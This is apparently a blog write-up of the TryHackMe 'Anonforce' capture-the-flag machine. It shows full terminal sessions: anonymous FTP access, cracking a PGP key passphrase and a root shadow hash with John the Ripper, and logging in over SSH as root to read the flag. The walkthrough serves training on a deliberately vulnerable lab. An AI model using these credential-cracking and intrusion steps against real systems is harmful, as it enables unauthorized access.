---
layout: post
title:  "THM: Anonforce"
date:   2021-01-03 19:45:00 +1100
category: hacking
---

## Introduction
*boot2root machine for FIT and bsides guatemala CTF*

This is [Anonforce](https://tryhackme.com/room/bsidesgtanonforce) from THM. Like Dav and Library, it's ranked easy. This box took me about 12 minutes.

## Ports
FTP and SSH only, on the standard ports.

## FTP
We've got anonymous login so let's use it; we get the root of the server! We've got one user (melodias), and we can get *user.txt*.

One unusual directory stands out: */notread*. What's inside?

{% highlight shell %}
ftp> ls -lash
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 .
drwxr-xr-x   23 0        0            4096 Aug 11  2019 ..
-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
ftp> mget *
mget backup.pgp? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for backup.pgp (524 bytes).
226 Transfer complete.
524 bytes received in 0.00 secs (1.0587 MB/s)
mget private.asc? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for private.asc (3762 bytes).
226 Transfer complete.
3762 bytes received in 0.00 secs (2.4473 MB/s)
{% endhighlight %}

## PGP
These are PGP files. We need to crack the password for the *asc* file:

{% highlight shell %}
root@kali:/opt/tryhackme/bsidesanon# gpg2john private.asc > private.john

File private.asc
root@kali:/opt/tryhackme/bsidesanon# ls
backup.pgp  nmap  passwd  private.asc  private.john  user.txt
root@kali:/opt/tryhackme/bsidesanon# john private.john -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xbox360          (anonforce)
1g 0:00:00:00 DONE (2021-01-03 03:38) 8.333g/s 7766p/s 7766c/s 7766C/s xbox360..madalina
Use the "--show" option to display all of the cracked passwords reliably
Session completed
{% endhighlight %}

Once we've done that, we can decrypt the file with *import* and *decrypt*:

{% highlight shell %}
root@kali:/opt/tryhackme/bsidesanon# gpg --import private.asc 
gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
gpg: key B92CD1F280AD82C2: secret key imported
gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
gpg: Total number processed: 2
gpg:              unchanged: 2
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
root@kali:/opt/tryhackme/bsidesanon# gpg --decrypt 
backup.pgp    nmap/         passwd        private.asc   private.john  user.txt      
root@kali:/opt/tryhackme/bsidesanon# gpg --decrypt backup.pgp 
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12
      "anonforce <melodias@anonforce.nsa>"
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
SNIP
{% endhighlight %}

So the *backup* file was a backup of the shadow file. We have two hashes; one for melodias, and one for root.

The root password is weak, and we can crack the hash and SSH in as root:

{% highlight shell %}
root@kali:/opt/tryhackme/bsidesanon# john hash -w=/usr/share/wordlists/rockyou.txt --format=sha512crypt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads

Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 0.01% (ETA: 06:07:35) 0g/s 1600p/s 1600c/s 1600C/s clifford..lovers1
hikari           (?)
1g 0:00:00:04 DONE (2021-01-03 03:42) 0.2336g/s 1614p/s 1614c/s 1614C/s 98765432..better
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@kali:/opt/tryhackme/bsidesanon# ssh root@10.10.86.220
The authenticity of host '10.10.86.220 (10.10.86.220)' can't be established.
ECDSA key fingerprint is SHA256:5evbK4JjQatGFwpn/RYHt5C3A6banBkqnngz4IVXyz0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.86.220' (ECDSA) to the list of known hosts.
root@10.10.86.220's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-157-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@ubuntu:~# pwd
/root
root@ubuntu:~# ls -lash
total 28K
4.0K drwx------  4 root root 4.0K Jan  3 00:42 .
4.0K drwxr-xr-x 23 root root 4.0K Aug 11  2019 ..
4.0K -rw-r--r--  1 root root 3.1K Oct 22  2015 .bashrc
4.0K drwx------  2 root root 4.0K Jan  3 00:42 .cache
4.0K drwxr-xr-x  2 root root 4.0K Aug 11  2019 .nano
4.0K -rw-r--r--  1 root root  148 Aug 17  2015 .profile
4.0K -rw-r--r--  1 root root   33 Aug 11  2019 root.txt
root@ubuntu:~# cat root.txt
f706456440c7af4187810c31c6cebdce
{% endhighlight %}


